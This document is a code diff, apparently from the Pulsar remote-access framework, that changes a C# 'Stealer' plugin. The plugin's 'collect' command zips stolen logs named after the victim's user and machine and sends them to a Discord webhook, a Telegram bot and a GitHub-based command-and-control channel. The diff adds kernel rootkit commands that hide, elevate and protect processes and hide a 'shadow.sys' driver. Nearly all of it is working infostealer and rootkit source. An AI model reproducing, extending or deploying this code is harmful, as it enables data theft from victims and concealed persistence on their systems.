@@ -14,6 +14,7 @@ using Intelix.Targets.Games;
 using Intelix.Targets.Messangers;
 using Intelix.Targets.Vpn;
 using Pulsar.Common.Plugins;
+using Pulsar.Plugins.Client.Modules;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -122,7 +123,7 @@ public sealed class Stealer : IUniversalPlugin
 
   public string[] SupportedCommands
   {
-    get => new string[1]{ "collect" };
+    get => new string[5]{ "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_hide_driver" };
   }
 
   public bool IsComplete => true;
@@ -188,44 +189,51 @@ public sealed class Stealer : IUniversalPlugin
 
   public PluginResult ExecuteCommand(string command, object parameters)
   {
-    if (command != "collect")
-      return new PluginResult()
-      {
-        Success = false,
-        Message = "Unknown command"
-      };
     try
     {
-      byte[] zipBytes = this.CollectLogs();
-      if (zipBytes == null || zipBytes.Length == 0)
-        return new PluginResult()
-        {
-          Success = false,
-          Message = "Logs collection failed or empty."
-        };
-      string fileName = $"{Environment.UserName}_{Environment.MachineName}_{DateTime.Now:yyyyMMdd}.zip";
-      if (!string.IsNullOrEmpty(this._discordWebhook))
-        Task.Run((Action) (() => this.SendToDiscord(this._discordWebhook, zipBytes, fileName)));
-      if (!string.IsNullOrEmpty(this._telegramToken) && !string.IsNullOrEmpty(this._telegramChatId))
-        Task.Run((Action) (() => this.SendToTelegram(this._telegramToken, this._telegramChatId, zipBytes, fileName)));
-      if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
-        Task.Run(async () => await Intelix.Targets.C2.GitHubC2.UploadFile(fileName, "log", zipBytes));
-      return new PluginResult()
+      string output;
+      bool success;
+      int pid = parameters != null ? Convert.ToInt32(parameters) : System.Diagnostics.Process.GetCurrentProcess().Id;
+
+      switch (command)
       {
-        Success = true,
-        Message = fileName,
-        Data = (object) zipBytes,
-        ShouldUnload = true
-      };
+        case "collect":
+          byte[] zipBytes = this.CollectLogs();
+          if (zipBytes == null || zipBytes.Length == 0)
+            return new PluginResult() { Success = false, Message = "Logs collection failed or empty." };
+          string fileName = $"{Environment.UserName}_{Environment.MachineName}_{DateTime.Now:yyyyMMdd}.zip";
+          if (!string.IsNullOrEmpty(this._discordWebhook))
+            Task.Run(() => this.SendToDiscord(this._discordWebhook, zipBytes, fileName));
+          if (!string.IsNullOrEmpty(this._telegramToken) && !string.IsNullOrEmpty(this._telegramChatId))
+            Task.Run(() => this.SendToTelegram(this._telegramToken, this._telegramChatId, zipBytes, fileName));
+          if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
+            Task.Run(async () => await Intelix.Targets.C2.GitHubC2.UploadFile(fileName, "log", zipBytes));
+          return new PluginResult() { Success = true, Message = fileName, Data = zipBytes, ShouldUnload = true };
+
+        case "kernel_hide":
+          success = ShadowWrapper.HideProcess(pid, out output);
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_elevate":
+          success = ShadowWrapper.ElevateProcess(pid, out output);
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_protect":
+          success = ShadowWrapper.ProtectProcess(pid, out output);
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_hide_driver":
+          string driverName = parameters as string ?? "shadow.sys";
+          success = ShadowWrapper.HideDriver(driverName, out output);
+          return new PluginResult() { Success = success, Message = output };
+
+        default:
+          return new PluginResult() { Success = false, Message = "Unknown command" };
+      }
     }
     catch (Exception ex)
     {
-      return new PluginResult()
-      {
-        Success = false,
-        Message = "Error: " + ex.Message,
-        ShouldUnload = true
-      };
+      return new PluginResult() { Success = false, Message = "Error: " + ex.Message, ShouldUnload = true };
     }
   }
 
